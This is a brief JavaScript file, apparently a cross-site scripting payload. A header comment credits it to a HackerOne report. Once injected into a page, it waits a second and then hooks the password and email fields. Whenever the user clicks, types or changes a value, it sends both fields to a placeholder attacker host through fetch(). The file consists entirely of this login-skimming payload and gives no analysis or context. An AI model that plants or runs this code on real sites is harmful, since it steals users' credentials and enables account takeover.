/* 
RIPOFF FROM https://hackerone.com/reports/2010530
*/

setTimeout(function () {
    a = document.getElementsByName('password')[0];
    b = document.getElementsByName('email')[0];
    function f() {
      fetch(`http://{{ATTACKER}}/?a=${encodeURIComponent(a.value)}&b=${encodeURIComponent(b.value)}`);
    }
    a.form.onclick=f;
    a.onchange=f;
    b.onchange=f;
    a.oninput=f;
    b.oninput=f;
  }, 1000)